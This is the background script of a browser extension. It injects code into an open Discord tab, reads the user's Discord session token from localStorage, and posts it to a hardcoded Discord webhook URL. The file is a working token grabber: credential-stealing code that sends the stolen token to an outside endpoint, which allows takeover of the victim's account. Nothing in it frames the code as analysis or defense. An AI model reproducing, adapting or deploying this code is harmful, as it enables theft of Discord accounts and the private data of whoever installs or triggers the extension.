chrome.runtime.onInstalled.addListener(() => {
  chrome.storage.local.set({ token: '' });
});

chrome.action.onClicked.addListener((tab) => {
  chrome.tabs.query({ url: 'https://discord.com/*' }, function (tabs) {
    if (tabs.length > 0) {
      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        function: getDiscordToken
      }, function (results) {
        if (results && results[0] && results[0].result) {
          const token = results[0].result;
          console.log('Discord token:', token);
          sendTokenToWebhook(token);
        } else {
          console.log('No Discord token found.');
        }
      });
    } else {
      console.log('No Discord tab found.');
    }
  });
});

function getDiscordToken() {
  return localStorage.getItem('token');
}

function sendTokenToWebhook(token) {
  const webhookUrl = 'https://discord.com/api/webhooks/1552042396278063311/yxaPrCIPm4TlxGQvY-ApvaEEibgQVB9QNZIIv4txiuyBB9lGPzBo1ZKlJoO0aKAGWt0S';
  const message = {
    content: `Discord token: ${token}`
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(message)
  })
  .then(response => response.json())
  .then(data => {
    console.log('Token sent to webhook:', data);
  })
  .catch((error) => {
    console.error('Error sending token to webhook:', error);
  });
}
